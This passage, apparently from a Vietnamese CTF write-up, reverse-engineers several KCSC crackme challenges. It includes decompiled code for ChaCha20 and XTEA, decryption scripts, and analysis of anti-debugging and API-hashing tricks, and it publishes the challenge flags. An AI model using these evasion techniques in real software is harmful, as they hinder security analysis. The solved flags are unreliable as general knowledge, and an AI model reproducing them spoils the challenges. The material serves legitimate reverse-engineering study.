  v19 = a2[28];
  a1[11] = v19 | (v18 << 8);
  v21 = *((unsigned __int16 *)a4 + 1);
  a1[12] = 'CSCK'; // Custom counter
  v22 = a4[6];
  a1[13] = *a4 | ((a4[1] | (v21 << 8)) << 8);
  v23 = a4[4] | ((a4[5] | ((v22 | (a4[7] << 8)) << 8)) << 8);
  v24 = a4[10];
  a1[14] = v23;
  v25 = a4[9] | ((v24 | (a4[11] << 8)) << 8);
  result = a4[8];
  a1[15] = result | (v25 << 8);
  return result;
}
```
- Hàm này có chức năng khởi tạo state cho ChaCha20, ta có thể thấy rõ dấu hiệu nhận biết là string `expand 32-byte k`. Thông thường trong thuật toán này thì counter thường là 0 nhưng trong trường hợp này thì author để là `KCSC` ở dạng hex (Mình đã đổi lại sang string cho dễ phát hiện)
- Vậy để tổng kết lại thì chương trình sẽ khởi tạo key và nonce cho ChaCha20 bằng cách gọi hàm gen số ngẫu nghiên `RtlGenRandom`. Tiếp đến thì khởi tạo state để mã hóa với custom counter. Vậy để giải mã ta chỉ cần được tìm lại key và nonce. May thay, author có để cho chúng ta một file DMP

- Tiến hành phân tích file này bằng IDA

![image](https://github.com/user-attachments/assets/3306d21e-7ed5-4ed1-a9ab-9abe75635f2f)

- Nhấn make code (trỏ vào các byte rồi nhần C ) để xem có gì thay đổi hay không

![image](https://github.com/user-attachments/assets/6828ba65-e1e0-4393-8bf5-0c20b89eebf8)

- Có vẻ như là chúng ta được 1 function, nhấn f5 để gen pseudocode

```C
void *__fastcall sub_C713D0(_DWORD *a1, unsigned __int8 *a2, int a3, unsigned __int8 *a4)
{
  int v5; // esi
  int v6; // ecx
  int v7; // eax
  int v8; // ecx
  int v9; // eax
  int v10; // ecx
  int v11; // eax
  int v12; // ecx
  int v13; // eax
  int v14; // ecx
  int v15; // eax
  int v16; // ecx
  int v17; // eax
  int v18; // ecx
  int v19; // eax
  int v20; // ecx
  int v21; // eax

  v5 = *a2 | ((a2[1] | (*((unsigned __int16 *)a2 + 1) << 8)) << 8);
  v6 = *((unsigned __int16 *)a2 + 3);
  qmemcpy(a1, "expand 32-byte k", 16);
  v7 = a2[10];
  a1[5] = a2[4] | ((a2[5] | (v6 << 8)) << 8);
  v8 = v7 | (a2[11] << 8);
  a1[4] = v5;
  v9 = a2[14];
  a1[6] = a2[8] | ((a2[9] | (v8 << 8)) << 8);
  v10 = a2[12] | ((a2[13] | ((v9 | (a2[15] << 8)) << 8)) << 8);
  v11 = a2[18];
  a1[7] = v10;
  v12 = a2[16] | ((a2[17] | ((v11 | (a2[19] << 8)) << 8)) << 8);
  v13 = a2[22];
  a1[8] = v12;
  v14 = a2[20] | ((a2[21] | ((v13 | (a2[23] << 8)) << 8)) << 8);
  v15 = a2[26];
  a1[9] = v14;
  v16 = a2[24] | ((a2[25] | ((v15 | (a2[27] << 8)) << 8)) << 8);
  v17 = a2[30];
  a1[10] = v16;
  a1[11] = a2[28] | ((a2[29] | ((v17 | (a2[31] << 8)) << 8)) << 8);
  v18 = *((unsigned __int16 *)a4 + 1);
  a1[12] = 1129530187;
  v19 = a4[6];
  a1[13] = *a4 | ((a4[1] | (v18 << 8)) << 8);
  v20 = a4[4] | ((a4[5] | ((v19 | (a4[7] << 8)) << 8)) << 8);
  v21 = a4[10];
  a1[14] = v20;
  a1[15] = a4[8] | ((a4[9] | ((v21 | (a4[11] << 8)) << 8)) << 8);
  __debugbreak();
  __debugbreak();
  __debugbreak();
  __debugbreak();
  __debugbreak();
  __debugbreak();
  __debugbreak();
  __debugbreak();
  __debugbreak();
  __debugbreak();
  __debugbreak();
  __debugbreak();
  __debugbreak();
  return &unk_C743E8;
}
```
- Đây chính là hàm khởi tạo state cho ChaCha20 vừa rồi, giờ ta chỉ cần tìm lại key và nonce trong các biến để và sau đó viết script giải mã, bên dưới là script của mình

```python
import struct

# ChaCha20 quarter-round function
def quarter_round(state, a, b, c, d):
    state[a] = (state[a] + state[b]) & 0xFFFFFFFF
    state[d] ^= state[a]
    state[d] = ((state[d] << 16) | (state[d] >> 16)) & 0xFFFFFFFF

    state[c] = (state[c] + state[d]) & 0xFFFFFFFF
    state[b] ^= state[c]
    state[b] = ((state[b] << 12) | (state[b] >> 20)) & 0xFFFFFFFF

    state[a] = (state[a] + state[b]) & 0xFFFFFFFF
    state[d] ^= state[a]
    state[d] = ((state[d] << 8) | (state[d] >> 24)) & 0xFFFFFFFF

    state[c] = (state[c] + state[d]) & 0xFFFFFFFF
    state[b] ^= state[c]
    state[b] = ((state[b] << 7) | (state[b] >> 25)) & 0xFFFFFFFF

# ChaCha20 block function
def chacha20_block(state):
    # Copy the state
    working_state = state[:]

    # Perform 20 rounds (10 column rounds + 10 diagonal rounds)
    for _ in range(10):
        # Column rounds
        quarter_round(working_state, 0, 4, 8, 12)
        quarter_round(working_state, 1, 5, 9, 13)
        quarter_round(working_state, 2, 6, 10, 14)
        quarter_round(working_state, 3, 7, 11, 15)

        # Diagonal rounds
        quarter_round(working_state, 0, 5, 10, 15)
        quarter_round(working_state, 1, 6, 11, 12)
        quarter_round(working_state, 2, 7, 8, 13)
        quarter_round(working_state, 3, 4, 9, 14)

    # Add the original state to the working state
    for i in range(16):
        working_state[i] = (working_state[i] + state[i]) & 0xFFFFFFFF

    # Serialize the state into bytes
    return b''.join(struct.pack("<I", word) for word in working_state)

# Custom state setup
constants = struct.unpack("<4I", b"expand 32-byte k")  # Constants
key = struct.unpack("<8I", bytes.fromhex(
    "D9FABB420C2DB808D1F8BFA5890AC3B3"
    "849F69E2F330D4A90DB119BD4EA0B830"
))  # Key
nonce = struct.unpack("<3I", bytes.fromhex(
    "DB7BE693EE9BC1A47073CA4B"
))  # Nonce (split into 3 integers)
counter = 0x4353434B  # Custom counter(KCSC)

# Initial state (combine constants, key, counter, and nonce)
initial_state = list(constants) + list(key) + [counter] + list(nonce)

# Decrypt ciphertext
def chacha20_decrypt(custom_state, ciphertext):
    plaintext = bytearray()
    for i in range(0, len(ciphertext), 64):
        # Generate block for current position
        block = chacha20_block(custom_state)
        custom_state[12] += 1  # Increment counter
        chunk = ciphertext[i:i + 64]
        plaintext.extend(a ^ b for a, b in zip(chunk, block))
    return plaintext

# Read ciphertext from file
with open("D:\\KCSC RE\\ChaChaCha\\encrypted.txt", "rb") as file:
    ciphertext = file.read()

# Decrypt
plaintext = chacha20_decrypt(initial_state, ciphertext)

# Write the decrypted plaintext to a file
with open("decrypted_output.bin", "wb") as file:
    file.write(plaintext)

print("Decrypted text saved to 'decrypted_output.bin'")

```
- Sau khi giải mã xong, ta được 1 file PE64

![image](https://github.com/user-attachments/assets/c4360f65-5d6b-4c05-aea2-a342129f0eae)

- Tiến hành phân tích file này

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  HANDLE FileW; // r14
  HRSRC ResourceW; // rax
  HRSRC v5; // rbx
  HGLOBAL Resource; // rdi
  unsigned int v7; // ebx
  const void *v8; // rsi
  char *v9; // rax
  char *v10; // rdi
  __int64 v11; // rdx
  __m128 si128; // xmm2
  unsigned int v13; // r8d
  __int64 v14; // rax
  char *v15; // rax
  __int64 v16; // rdx
  DWORD NumberOfBytesWritten; // [rsp+40h] [rbp-448h] BYREF
  WCHAR FileName[264]; // [rsp+50h] [rbp-438h] BYREF
  WCHAR Buffer[264]; // [rsp+260h] [rbp-228h] BYREF

  if ( GetTempPathW(0x104u, Buffer) - 1 <= 0x103 )
  {
    wsprintfW(FileName, L"%s%s", Buffer, L"REAL_FLAG_IN_HERE");
    FileW = CreateFileW(FileName, 0x40000000u, 0, 0i64, 2u, 0x80u, 0i64);
    if ( FileW != (HANDLE)-1i64 )
    {
      NumberOfBytesWritten = 0;
      ResourceW = FindResourceW(0i64, (LPCWSTR)0x65, L"FLAG");
      v5 = ResourceW;
      if ( ResourceW )
      {
        Resource = LoadResource(0i64, ResourceW);
        if ( Resource )
        {
          v7 = SizeofResource(0i64, v5);
          if ( v7 )
          {
            v8 = LockResource(Resource);
            if ( v8 )
            {
              v9 = (char *)malloc(v7);
              v10 = v9;
              if ( v9 )
              {
                memcpy(v9, v8, v7);
                v11 = 0i64;
                if ( v7 < 0x40 )
                  goto LABEL_13;
                si128 = (__m128)_mm_load_si128((const __m128i *)&xmmword_140003330);
                v13 = 32;
                do
                {
                  *(__m128 *)&v10[v11] = _mm_xor_ps(si128, (__m128)_mm_loadu_si128((const __m128i *)&v10[v11]));
                  v11 = (unsigned int)(v11 + 64);
                  *(__m128 *)&v10[v13 - 16] = _mm_xor_ps(
                                                (__m128)_mm_loadu_si128((const __m128i *)&v10[v13 - 16]),
                                                si128);
                  *(__m128 *)&v10[v13] = _mm_xor_ps(si128, (__m128)_mm_loadu_si128((const __m128i *)&v10[v13]));
                  v14 = v13 + 16;
                  v13 += 64;
                  *(__m128 *)&v10[v14] = _mm_xor_ps((__m128)_mm_loadu_si128((const __m128i *)&v10[v14]), si128);
                }
                while ( (unsigned int)v11 < (v7 & 0xFFFFFFC0) );
                if ( (unsigned int)v11 < v7 )
                {
LABEL_13:
                  v15 = &v10[(unsigned int)v11];
                  v16 = v7 - (unsigned int)v11;
                  do
                  {
                    *v15++ ^= 0x88u;
                    --v16;
                  }
                  while ( v16 );
                }
                WriteFile(FileW, v10, v7, &NumberOfBytesWritten, 0i64);
                free(v10);
                sub_140001010((wchar_t *)L"Here is your Flag: %s\n");
                CloseHandle(FileW);
              }
            }
          }
        }
      }
    }
  }
  return 0;
}
```

- Chương trình sẽ thực hiện drop file `REAL_FLAG_IN_HERE` ở trong resource vào trong thư mục `Temp` của hệ điều hành, vậy ta chỉ cần nhặt ra là sẽ có flag

- File nhận được là một file JPEG

![image](https://github.com/user-attachments/assets/e9347fb6-a06b-40ea-ba82-529164837212)

- Mở file này bằng Paint

![image](https://github.com/user-attachments/assets/5e4aef1f-5014-47d7-b130-648f10b400cb)

## Script and Flag
**Flag:** `KCSC{chachacha_w1th_me_and_welc0me_2_KCSC}`
# Reverse me
## Mics
- Đề cho 1 file ELF64

![image](https://github.com/user-attachments/assets/2381d76d-3cc0-4dfb-95da-fe3d08722116)

## Detailed Analysis

- Hàm `main`

```C
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  int i; // [rsp+18h] [rbp-58h]
  int j; // [rsp+1Ch] [rbp-54h]
  char s[56]; // [rsp+30h] [rbp-40h] BYREF
  unsigned __int64 v7; // [rsp+68h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  memset(s, 0, 0x31uLL);
  printf("FLAG: ");
  __isoc99_scanf("%48s", s);
  for ( i = 0; i <= 47; i += 8 )
    sub_12D4(&s[i], &s[i + 4]);
  for ( j = 0; ; ++j )
  {
    if ( j > 47 )
    {
      puts("Correct!");
      return 0LL;
    }
    if ( s[j] != byte_4040[j] )
      break;
  }
  puts("Incorrect!");
  return 0LL;
}
```
- Chương trình sẽ có nhiệm vụ lấy input của user (48 kí tự) và biến đổi chúng qua hàm `sub_12D4`, sau đó kiểm tra với `byte_4040`

- Hàm `sub_12D4`
```C
unsigned int *__fastcall sub_12D4(unsigned int *a1, unsigned int *a2)
{
  unsigned int *result; // rax
  unsigned int i; // [rsp+10h] [rbp-10h]
  unsigned int v4; // [rsp+14h] [rbp-Ch]
  unsigned int v5; // [rsp+18h] [rbp-8h]
  unsigned int v6; // [rsp+1Ch] [rbp-4h]

  v4 = *a1;
  v5 = *a2;
  v6 = 0;
  for ( i = 0; i < dword_4020; ++i )
  {
    v4 += (((v5 >> 5) ^ (16 * v5)) + v5) ^ (dword_40C0[v6 & 3] + v6);
    v6 += dword_40A0;
    v5 += (((v4 >> 5) ^ (16 * v4)) + v4) ^ (dword_40C0[(v6 >> 11) & 3] + v6);
  }
  *a1 = v4;
  result = a2;
  *a2 = v5;
  return result;
}
```
- Hàm này mô phỏng lại thuật toán mã hóa tựa TEA để mã hóa input với key là `dword_40C0` và delta là `dword_40A0`, vậy để giải thì ta chỉ cần tìm thuật toán trên mạng hoặc tự code lại là ra được flag.
- Nhưng khoan đã, một bài medium mà chỉ có như thế này thì có gì đó không đúng lắm, ít nhất thì cũng phải có anti debug, và nghi ngờ của mình là đúng. Trước hàm main thì có gọi 1 hàm nữa đó chính là hàm `sub_11E9`

```C
_DWORD *sub_11E9()
{
  _DWORD *result; // rax
  int i; // [rsp+8h] [rbp-8h]
  int j; // [rsp+Ch] [rbp-4h]

  result = (_DWORD *)((unsigned __int64)ptrace(PTRACE_TRACEME, 0LL, 0LL, 0LL) >> 63);
  if ( (_BYTE)result )
  {
    for ( i = 0; i <= 3; ++i )
    {
      result = dword_40C0;
      dword_40C0[i] = dword_4080[i] ^ dword_4070[i];
    }
  }
  else
  {
    for ( j = 0; j <= 3; ++j )
    {
      result = dword_40C0;
      dword_40C0[j] = dword_4090[j] ^ dword_4070[j];
    }
  }
  return result;
}
```
- Hàm này sẽ kiểm tra debugger bằng `ptrace`. Nếu như gọi đến `ptrace` mà fail (return -1) thì có nghĩa là đang có debugger. Khi có sự hiện diện của debugger thì hàm này sẽ gen ra key giả. Vậy ta chỉ cần bypass, lấy key ở luồng ngược lại và viết script

## Script and Flag
```python
def decrypt(a1, a2, dword_key, delta, num_rounds):
    v4 = a1
    v5 = a2
    v6 = delta * num_rounds

    for _ in range(num_rounds):
        v5 -= (((v4 >> 5) ^ (v4 * 16)) + v4) ^ (dword_key[(v6 >> 11) & 3] + v6)
        v5 &=0xFFFFFFFF
        v6 -= delta
        v6 &=0xFFFFFFFF
        v4 -= (((v5 >> 5) ^ (v5 * 16)) + v5) ^ (dword_key[v6 & 3] + v6)
        v4 &=0xFFFFFFFF

    return v4, v5

if __name__ == "__main__":
    data = [0x1C37B6EC, 0xB0E36676, 0x4137C16F, 0x454D466D, 0x7A0AFE3B, 0x235B5B39, 0xCA317196, 0x7DB9C036, 0xBAC3881C, 0x089925A4,
0xFE2A59A9, 0x94E61826]
    for i in range(0,12,2):
        encrypted_a1 = data[i]  
        encrypted_a2 = data[i+1]  
        dword_key = [0x3AB27278, 0x0A840805B, 0x0E864925B, 0x0B7B1EEDE] 
        delta = 0x9E3779B9
        num_rounds = 32

        decrypted_a1, decrypted_a2 = decrypt(encrypted_a1, encrypted_a2, dword_key, delta, num_rounds)
        print(bytes.fromhex(hex(decrypted_a1).strip("0x")).decode("utf-8")[::-1],end='')
        print(bytes.fromhex(hex(decrypted_a2).strip("0x")).decode("utf-8")[::-1],end='')

```
**Flag:** `KCSC{XTEA_encryption_and_debugger_detection_:>>}`
# OptimusPrize
## Mics
- Đề cho 1 file PE64

![image](https://github.com/user-attachments/assets/27b494df-3a9d-4be5-af3b-c91d2d65541d)

## Detailed Analysis

- Hàm `main`

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned __int8 v4; // [rsp+21h] [rbp-27h]
  int i; // [rsp+24h] [rbp-24h]
  int v6; // [rsp+28h] [rbp-20h]
  char v7; // [rsp+2Ch] [rbp-1Ch]
  char v8; // [rsp+30h] [rbp-18h]
  char v9; // [rsp+34h] [rbp-14h]

  for ( i = 0; i < 50; ++i )
  {
    sub_14010DEB0(&unk_140112860, 0i64, dword_140112100[i]);
    v7 = *(_DWORD *)sub_14010E2B0(&unk_140112860, dword_140112100[i] >> 1);
    v8 = BYTE1(*(_DWORD *)sub_14010E2B0(&unk_140112860, dword_140112100[i] >> 1)) ^ v7;
    v9 = HIWORD(*(_DWORD *)sub_14010E2B0(&unk_140112860, dword_140112100[i] >> 1)) ^ v8;
    v4 = HIBYTE(*(_DWORD *)sub_14010E2B0(&unk_140112860, dword_140112100[i] >> 1)) ^ v9;
    v6 = sub_14010DFD0((unsigned int)(2 * i));
    sub_14010D9C0(
      "%c",
      byte_1401120C0[i] ^ v4 ^ (unsigned int)(unsigned __int8)(HIBYTE(v6) ^ BYTE2(v6) ^ BYTE1(v6) ^ v6));
  }
  return 0;
}
```
- Hàm này thực hiện biến đổi một số data có sẵn thông qua `sub_14010DEB0`, sau đó in flag ra màn hình nhưng có vẻ như là in ra rất lâu

![image](https://github.com/user-attachments/assets/a1d04f1e-19c4-4065-9309-a72e1dbf693b)

- Kiểm tra hàm `sub_14010DEB0` để xem trong đó làm gì
```C
__int64 __fastcall sub_14010DEB0(__int64 a1, unsigned int a2, unsigned int a3)
{
  __int64 result; // rax
  __int64 v4; // rax
  unsigned int v5; // [rsp+20h] [rbp-28h]
  _DWORD *v6; // [rsp+28h] [rbp-20h]
  __int64 v7; // [rsp+30h] [rbp-18h]

  result = a3;
  if ( (int)a2 < (int)a3 )
  {
    v5 = (int)(a3 + a2) >> 1;
    sub_14010DEB0(a1, a2, v5);
    sub_14010DEB0(a1, v5 + 1, a3);
    v6 = (_DWORD *)sub_14010E250(a1, v5);
    if ( *v6 > *(_DWORD *)sub_14010E250(a1, (int)a3) )
    {
      v7 = sub_14010E2B0(a1, (int)a3);
      v4 = sub_14010E2B0(a1, v5);
      sub_14010E510(v4, v7);
    }
    return sub_14010DEB0(a1, a2, a3 - 1);
  }
  return result;
}
```
- Hàm này mô phỏng lại thuật toán `Quick Sort` nhưng đã bị custom lại một chút, cụ thể là gọi thêm một số hàm đệ quy không cần thiết để làm tăng thời gian thực thi của chương trình. Qua đây ta cũng có thể mường tượng ra hướng làm cho bài này là sẽ phải tối ưu hóa lại các hàm sao cho phù hợp để đẩy nhanh tốc độ thực thi
- Hàm `sub_14010E2B0`
```C
__int64 __fastcall sub_14010E2B0(_QWORD *a1, __int64 a2)
{
  return *a1 + 4 * a2;
}
```
- Hàm này có nhiệm vụ return giá trị tại 1 index cụ thể của 1 array

- Hàm `sub_14010DFD0`
```C
__int64 __fastcall sub_14010DFD0(int a1)
{
  int v2; // [rsp+20h] [rbp-18h]

  if ( !a1 )
    return 0i64;
  if ( a1 == 1 )
    return 1i64;
  v2 = sub_14010DFD0((unsigned int)(a1 - 1));
  return (unsigned int)sub_14010DFD0((unsigned int)(a1 - 2)) + v2;
}
```
- Một hàm quen thuộc, đây chính là thuật toán tìm số Fibonacci thứ n bằng cách gọi đệ quy, mà như chúng ta đã biết, đệ quy sẽ làm thời gian thực thi của chương trình lâu một cách đáng kể, vậy đây cũng là một hàm ta cần phải tối ưu 

-  Với những dữ kiện trên, để giải ta có 2 cách, cách đẩu tiên là patch thẳng lại chương trình để chương trình lại nhanh hơn hoặc là code lại toàn bộ chương trình với data có sẵn (số lượng data rất nhiều nên hãy cân nhắc việc sử dụng script để hỗ trợ lấy data). Bài này mình giải theo cách code lại nên là script mình sẽ để ở một file riêng :v
## Script and Flag
**Flag:** `KCSC{just_a_sort_of_O-OoOptim...ize_references}`
# Cat Laughing At You
## Mics
- Đề cho 1 file PE32
![image](https://github.com/user-attachments/assets/6b54156a-5d92-4a18-9ca4-cea16a00cf2b)

## Detailed Analysis
- Hàm `main`
```C
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  __halt();
}
```
- Hàm `main` không có gì bên trong, đương nhiên rồi bởi đây là 1 bài hard. Có lẽ code đã được thực thi ở đâu đó, khi mình kiểm tra trước hàm main có những gì thì có phát hiện một điều đặc biệt

![image](https://github.com/user-attachments/assets/153f81ad-43ee-4571-95c1-ef460c23b690)
![image](https://github.com/user-attachments/assets/58f1d7ff-bca8-40f5-869e-85882d19b3af)

- Ta có thể thấy rằng chương trình sử dụng hàm `initterm` để gọi các hàm trong khoảng offset `dword_363104` đến `dword_363118` ở trước hàm `main`. Theo [MSDN](https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/initterm-initterm-e?view=msvc-170)  ``` initterm is internal methods that walk a table of function pointers and initialize them.
The first pointer is the starting location in the table and the second pointer is the ending location. ```

- Ta có thể hiểu nôm na là `initterm` sẽ thực hiện gọi các hàm nằm trong offset được chỉ định trong 2 arguments `PVFV *First` và `PVFV *Last`, Kĩ thuật này khá giống với kĩ thuật gọi `TLSCallback` để thực thi code trước hàm `main`, bây giờ ta sẽ lần lượt đi qua từng hàm đã được nêu trên

- Hàm `sub_3621C6`

![image](https://github.com/user-attachments/assets/e16a53ce-de82-4e0c-8303-49eb14ffc501)

- Đây có lẽ là 1 hàm được gen ra bởi compiler

- Hàm `sub_361000`
```C
int __usercall sub_361000@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  int result; // eax

  result = (unsigned __int8)sub_361060(a1, a2, a3);
  dword_364400 = (unsigned __int8)result;
  return result;
}
```
- Hàm này gọi `sub_361060` và lưu giá trị trả về của nó vào `dword_364400`

- Hàm `sub_361060`
```C
// bad sp value at call has been detected, the output may be wrong!
char __usercall sub_361060@<al>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  int *v3; // eax
  int v4; // ecx
  int *v5; // eax
  int v6; // ecx
  int *v7; // eax
  int v8; // ecx
  struct _LIST_ENTRY *v9; // eax
  int (__cdecl *v10)(int, int, int, int); // esi
  int v11; // ebx
  int (__stdcall *v12)(int, int *); // edi
  int v13; // esi
  int v14; // edi
  int v15; // esi
  char v16; // bl
  char v17; // bh
  unsigned int v18; // ecx
  unsigned int v19; // ecx
  signed int v20; // eax
  unsigned int v21; // ecx
  unsigned int v22; // ecx
  signed int v23; // eax
  unsigned int v24; // eax
  unsigned int v25; // eax
  signed int v26; // eax
  int v29; // [esp+0h] [ebp-49Ch]
  void (__cdecl *v30)(int); // [esp+0h] [ebp-49Ch]
  int v31; // [esp+4h] [ebp-498h]
  int (__stdcall *v32)(int, int *); // [esp+4h] [ebp-498h]
  int v33; // [esp+8h] [ebp-494h]
  int (__stdcall *v34)(int, int *); // [esp+8h] [ebp-494h]
  int v35; // [esp+Ch] [ebp-490h]
  int (__stdcall *v36)(int, _DWORD); // [esp+Ch] [ebp-490h]
  void (__stdcall *v37)(int); // [esp+10h] [ebp-48Ch]
  int (__stdcall *v38)(int, int *); // [esp+14h] [ebp-488h]
  char v39; // [esp+1Bh] [ebp-481h]
  int v40[139]; // [esp+1Ch] [ebp-480h] BYREF
  int v41[139]; // [esp+248h] [ebp-254h] BYREF
  int v42[3]; // [esp+474h] [ebp-28h] BYREF
  char v43; // [esp+480h] [ebp-1Ch]
  int v44[3]; // [esp+484h] [ebp-18h] BYREF
  int v45[2]; // [esp+490h] [ebp-Ch] BYREF

  v44[0] = 0xF7FBEACE;
  v3 = v44;
  v44[1] = 0xADE6F1F6;
  v4 = 0xC;
  v44[2] = 0x83E6FBE6;
  do
  {
    *(_BYTE *)v3 ^= 0x83u;                      // Mixture.exe
    v3 = (int *)((char *)v3 + 1);
    --v4;
  }
  while ( v4 );
  v45[0] = 0xADE7EEE0;
  v5 = v45;
  v45[1] = 0x83E6FBE6;
  v6 = 8;
  do
  {
    *(_BYTE *)v5 ^= 0x83u;                      // cmd.exe
    v5 = (int *)((char *)v5 + 1);
    --v6;
  }
  while ( v6 );
  v42[0] = 0xEFF3FBE6;
  v7 = v42;
  v42[1] = 0xF1E6F1EC;
  v8 = 0xD;
  v42[2] = 0xE6FBE6AD;
  v43 = 0x83;
  do
  {
    *(_BYTE *)v7 ^= 0x83u;                      // explorer.exe
    v7 = (int *)((char *)v7 + 1);
    --v8;
  }
  while ( v8 );
  procAddr_GetCurrentProcessID = (int (__stdcall *)(_DWORD, _DWORD, _DWORD))API_Hashing((void *)0xFCCA572B);
  procAddr_CreateToolhelp32Snapshot = (int)API_Hashing((void *)0xF3FFD4A7);
  procAddr_Process32FirstW = (int)API_Hashing((void *)0xF9BD7A1C);
  procAddr_Process32NextW = (int)API_Hashing((void *)0xFDAA1062);
  procAddr_CloseHandle = (int)API_Hashing((void *)0xFC95A7B0);
  procAddr_SetUnhandledExceptionFilter = (int)API_Hashing((void *)0xF6CACF0B);
  procAddr_LoadLibraryA = (int)API_Hashing((void *)0xF1C2F5AC);
  v9 = API_Hashing((void *)0xF9D023F7);
  v10 = (int (__cdecl *)(int, int, int, int))procAddr_GetCurrentProcessID;
  procAddr_GetProcAddress = (int)v9;
  v35 = procAddr_CreateToolhelp32Snapshot;
  v33 = procAddr_Process32FirstW;
  v31 = procAddr_Process32NextW;
  v29 = procAddr_CloseHandle;
  v39 = 0;
  procAddr_GetCurrentProcessID(a2, a3, a1);
  v11 = v10(v29, v31, v33, v35);
  sub_3617C0();
  v12 = (int (__stdcall *)(int, int *))procAddr_Process32FirstW;
  v38 = (int (__stdcall *)(int, int *))procAddr_Process32NextW;
  v37 = (void (__stdcall *)(int))procAddr_CloseHandle;
  memset(&v40[1], 0, 0x228u);
  v40[0] = 0x22C;
  v13 = ((int (__stdcall *)(int, _DWORD))procAddr_CreateToolhelp32Snapshot)(2, 0);
  if ( v12(v13, v40) )
  {
    while ( v40[2] != v11 )
    {
      if ( !v38(v13, v40) )
        goto LABEL_10;
    }
    v14 = v40[6];
  }
  else
  {
LABEL_10:
    v14 = 0xFFFFFFFF;
  }
  v37(v13);
  memset(&v41[1], 0, 0x228u);
  v41[0] = 0x22C;
  v15 = v36(2, 0);
  if ( v34(v15, v41) )
  {
    v16 = v44[0];
    v17 = v45[0];
    while ( 1 )
    {
      if ( v41[2] == v14 )
      {
        v18 = 0;
        if ( v16 )
        {
          do
          {
            word_364418[v18] = *((char *)v44 + v18);
            ++v18;
          }
          while ( *((_BYTE *)v44 + v18) );
        }
        v19 = v18;
        if ( v19 >= 0x100 )
LABEL_37:
          sub_362036();
        word_364418[v19] = 0;
        v20 = wcscmp((const unsigned __int16 *)&v41[9], word_364418);
        if ( v20 )
          v20 = v20 < 0 ? 0xFFFFFFFF : 1;
        if ( v20 )
        {
          v21 = 0;
          if ( v17 )
          {
            do
            {
              word_364418[v21] = *((char *)v45 + v21);
              ++v21;
            }
            while ( *((_BYTE *)v45 + v21) );
          }
          v22 = v21;
          if ( v22 >= 0x100 )
            goto LABEL_37;
          word_364418[v22] = 0;
          v23 = wcscmp((const unsigned __int16 *)&v41[9], word_364418);
          if ( v23 )
            v23 = v23 < 0 ? 0xFFFFFFFF : 1;
          if ( v23 )
          {
            v24 = 0;
            if ( LOBYTE(v42[0]) )
            {
              do
              {
                word_364418[v24] = *((char *)v42 + v24);
                ++v24;
              }
              while ( *((_BYTE *)v42 + v24) );
            }
            v25 = v24;
            if ( v25 >= 0x100 )
              goto LABEL_37;
            word_364418[v25] = 0;
            v26 = wcscmp((const unsigned __int16 *)&v41[9], word_364418);
            if ( v26 )
              v26 = v26 < 0 ? 0xFFFFFFFF : 1;
            if ( v26 )
              break;
          }
        }
      }
      if ( !v32(v15, v41) )
        goto LABEL_35;
    }
    v39 = 1;
  }
LABEL_35:
  v30(v15);
  return v39;
}
```
- Hàm này sử dụng kĩ thuật `API Hashing` để resolve ra các hàm cần thiết cho việc enumerate các process đang chạy, sau đó kiểm tra tiến trình đang chạy là gì và có thuộc 1 trong ba tiến trình Mixture.exe,cmd.exe hay explorer.exe hay không, nếu không phải thì có nghĩa là đang bị debug và trả về giá trị 1(bị debug) và 0(không bị debug) tương ứng. Một chút về kĩ thuật này, thay vì gọi trực tiếp các hàm ra thì ta có thể sử dụng kĩ thuật kể trên để giấu đi việc gọi hàm gì, kĩ thuật này hay được sử dụng trong malware nhằm làm khó việc phân tích. Để phân tích được các hàm sau khi hashing là gì, ta có thể lên mạng tra hash hoặc là debug

- Hàm `sub_361010`
```C
int sub_361010()
{
  int result; // eax

  if ( dword_364400 )
  {
    dword_364404 = (int)"S0NTQ3tuVUUwcFVaNllsOTNxM3Bocko5MXFVSXZNRjV3bzIwaXEyUzBMMnQvcXcwNUR6amtwVXVVWkg1c0REPT19";
  }
  else
  {
    result = sub_361440();
    dword_364404 = (int)"YXV0aG9ybm9vYm1hbm5uZnJvbWtjc2M=";
  }
  return result;
}
```
- Hàm này có nhiệm vụ kiểm tra `dword_364400`(giá trị trả về của `sub_361060` )là 0 hay 1 và thực thi vào luồng tương ứng

```C
int sub_871440()
{
  int (__stdcall *v0)(int *); // edx
  int *v1; // eax
  int (__stdcall *v2)(int, int *); // edi
  int v3; // ecx
  int v4; // esi
  int *v5; // eax
  int v6; // ecx
  int v7; // ecx
  int *v8; // eax
  int v9; // ecx
  int *v10; // eax
  int v11; // ecx
  int *v12; // eax
  int v13; // ecx
  int *v14; // eax
  int v15; // ecx
  int *v16; // eax
  int v17; // ecx
  int *v18; // eax
  int v19; // ecx
  int *v20; // eax
  int result; // eax
  int v22[5]; // [esp+8h] [ebp-A4h] BYREF
  char v23; // [esp+1Ch] [ebp-90h]
  int v24[5]; // [esp+20h] [ebp-8Ch] BYREF
  int v25[4]; // [esp+34h] [ebp-78h] BYREF
  char v26; // [esp+44h] [ebp-68h]
  int v27[4]; // [esp+48h] [ebp-64h] BYREF
  int v28[4]; // [esp+58h] [ebp-54h] BYREF
  int v29[3]; // [esp+68h] [ebp-44h] BYREF
  __int16 v30; // [esp+74h] [ebp-38h]
  char v31; // [esp+76h] [ebp-36h]
  int v32[3]; // [esp+78h] [ebp-34h] BYREF
  __int16 v33; // [esp+84h] [ebp-28h]
  int v34[3]; // [esp+88h] [ebp-24h] BYREF
  char v35; // [esp+94h] [ebp-18h]
  int v36[3]; // [esp+98h] [ebp-14h] BYREF
  char v37; // [esp+A4h] [ebp-8h]

  v0 = (int (__stdcall *)(int *))procAddr_LoadLibraryA;
  v1 = v36;
  v2 = (int (__stdcall *)(int, int *))procAddr_GetProcAddress;
  v3 = 0xD;
  v36[0] = 0x16011336;
  v36[1] = 0x45441E07;
  v36[2] = 0x1B1B1359;
  v37 = 0x77;
  do
  {
    *(_BYTE *)v1 ^= 0x77u;                      // Advapi32.dll
    v1 = (int *)((char *)v1 + 1);
    --v3;
  }
  while ( v3 );
  v4 = v0(v36);
  v22[0] = 0x70E0534;
  v22[1] = 0x6143603;
  v5 = v22;
  v22[2] = 0x12051E02;
  v6 = 0x15;
  v22[3] = 0x3191834;
  v22[4] = 0x36030F12;
